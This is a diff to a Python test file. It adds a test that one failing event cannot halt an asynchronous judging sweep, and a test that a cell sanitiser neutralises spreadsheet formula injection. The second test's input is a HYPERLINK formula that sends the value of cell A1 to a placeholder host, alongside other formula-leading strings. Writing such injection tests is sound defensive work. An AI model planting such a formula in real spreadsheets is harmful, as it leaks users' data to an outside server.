@@ -122,3 +122,35 @@ def test_the_gate_scores_the_served_verdict_not_the_answer(tmp_path):
 
     sheet.write_text(header + served_same_right + served_same_wrong + served_same_wrong + not_served + translated_right)
     assert score(sheet) == 1  # 19/21 < 0.95, however right the unserved 30 were
+
+
+@pytest.mark.asyncio(loop_scope="session")
+async def test_one_failing_event_cannot_block_the_rest_of_the_sweep(monkeypatch):
+    """Security review 2026-09-23: a raise inside one event's judging used to
+    escape the sweep, so the same card was re-selected and re-crashed every
+    fifteen minutes and every event sorted after it was never judged."""
+    bad, good = uuid.uuid4(), uuid.uuid4()
+
+    async def fake_recent(session, *, days, limit, offset=0):
+        return [(bad, "bad"), (good, "good")]
+
+    async def fake_judge(session, event_id, title, *, write=True):
+        if event_id == bad:
+            raise IndexError("list index out of range")
+        return {"cards": 1, "judged": 1, "cost": 0.0001, "verdicts": {}}
+
+    monkeypatch.setattr(renderings, "recent_events", fake_recent)
+    monkeypatch.setattr(renderings, "judge_event", fake_judge)
+    async with session_scope() as s:
+        out = await renderings.sweep(s)
+    assert out["judged"] == 1, "the event after the failing one must still be judged"
+
+
+def test_scraped_text_cannot_become_a_spreadsheet_formula():
+    from tools.gold_renderings import cell
+
+    assert cell('=HYPERLINK("http://x.example/?d="&A1,"read")') == '\'=HYPERLINK("http://x.example/?d="&A1,"read")'
+    for hostile in ("+1+1", "-2+3", "@SUM(A1)", "\tlead", "\rlead"):
+        assert cell(hostile).startswith("'"), hostile
+    assert cell("You must go to school") == "You must go to school"
+    assert cell(0.5) == 0.5
